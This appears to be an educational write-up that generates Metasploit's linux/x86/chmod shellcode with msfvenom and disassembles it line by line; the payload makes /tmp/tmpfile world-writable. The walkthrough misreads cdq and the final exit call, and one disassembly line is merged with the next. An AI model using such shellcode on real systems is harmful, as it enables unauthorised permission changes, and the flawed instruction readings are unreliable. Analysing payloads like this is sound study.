# Analyze: chmod

# Create shellcode
```bash
msfvenom -p linux/x86/chmod -f c FILE=/tmp/tmpfile MODE=0777
```

This shellcode will change the permissions of the target file `/tmp/tmpfile` to `0777` or read/write/execute for all users.

# Analysis

## Disassemble w/ bash
```bash
echo -n "\x99\x6a\x0f\x58\x52\xe8\x0d\x00\x00\x00\x2f\x74\x6d\x70\x2f\x74\x6d\x70\x66\x69\x6c\x65\x00\x5b\x68\xff\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
```

## Disassembled Assembly

```x86asm
00000000  99                cdq
00000001  6A0F              push byte +0xf
00000003  58                pop eax
00000004  52                push edx
00000005  E80D000000        call 0x17
0000000A  2F                das
0000000B  746D              jz 0x7a0000000D  702F              jo 0x3e
0000000F  746D              jz 0x7e
00000011  7066              jo 0x79
00000013  696C65005B68FF01  imul ebp,[ebp+0x0],dword 0x1ff685b
0000001B  0000              add [eax],al
0000001D  59                pop ecx
0000001E  CD80              int 0x80
00000020  6A01              push byte +0x1
00000022  58                pop eax
00000023  CD80              int 0x80
```

## Disassembly Analysis
The first instruction is:

```x86asm
00000000  99                cdq
```

This one is quite interesting, it seems to be clearing the value of `eax`, however, it seems unnecessary as a value from the stack is poped into eax in the next couple instructions. I belive it is also clearing out the value of edx as edx is pushed to the stack next, and this would be the only instruction used to control the value in edx. Very interesting!

```x86asm
00000001  6A0F              push byte +0xf
00000003  58                pop eax
00000004  52                push edx
```

The value of `0xf` is the number `15` in decimal form and corresponds to the function [chmod()](https://man7.org/linux/man-pages/man2/chmod.2.html) when the syscall is triggered. It's function definition looks like this:

```c
int chmod(const char *pathname, mode_t mode)
```

Next a call is made to 0x17, which will place the pointer to `0000000A` on the stack and will probably be used later as a string. I can confrim this because the instructions that start at `0000000A` are a mess and decode to a string. `2F746D702F746D7066696C6500` correspond to the string `/tmp/tmpfile`

```x86asm
00000005  E80D000000        call 0x17
0000000A  2F746D702F746D7066696C6500  ; /tmp/tmpfile
```

To rebuild the rest of the shellcode from being scrambled and offset, I will run this command with the remaining shellcode bytes that have yet to be analyzed:

```bash
echo -n "`python2 -c 'print "\x90"*23'`\x5b\x68\xff\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -p intel - | grep -v nop
```

Then the pointer to the string on the stack is poped into `ebx`, the value of `0x1ff` is pushed to the stack and poped into `ecx` as the second parameter to chmod and is `777` in decimal (global read/write/execute).

```x86asm
00000017  5B                pop ebx             ; ptr to: [string] /tmp/tmpfile
00000018  68FF010000        push dword 0x1ff    ; 
0000001D  59                pop ecx             ; ecx = 0x1ff - OCT = 777
0000001E  CD80              int 0x80            ; chmod("/tmp/tmpfile", 0x1ff)
```

Finally, the program exits gracefully with a status code of 1. 

```x86asm
00000020  6A01              push byte +0x1      
00000022  58                pop eax
00000023  CD80              int 0x80            ; exit()
```





## Disassembled (Cleaned and commented)

Here I have cleaned and commented the code in totality:

```x86asm
00000000  99                cdq             
00000001  6A0F              push byte +0xf      ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 15$"
                                                
00000003  58                pop eax             ; int chmod(const char *pathname, mode_t mode);
00000004  52                push edx            ; 
00000005  E80D000000        call 0x17           ; jmp label1


0000000A  2F746D702F746D7066696C6500            ; (ascii) /tmp/tmpfile

lebel1:
00000017  5B                pop ebx             ; ptr to: [string] /tmp/tmpfile
00000018  68FF010000        push dword 0x1ff    ; 
0000001D  59                pop ecx             ; ecx = 0x1ff - OCT = 777
0000001E  CD80              int 0x80            ; chmod("/tmp/tmpfile", 0x1ff)



00000020  6A01              push byte +0x1      
00000022  58                pop eax
00000023  CD80              int 0x80            ; exit()
```
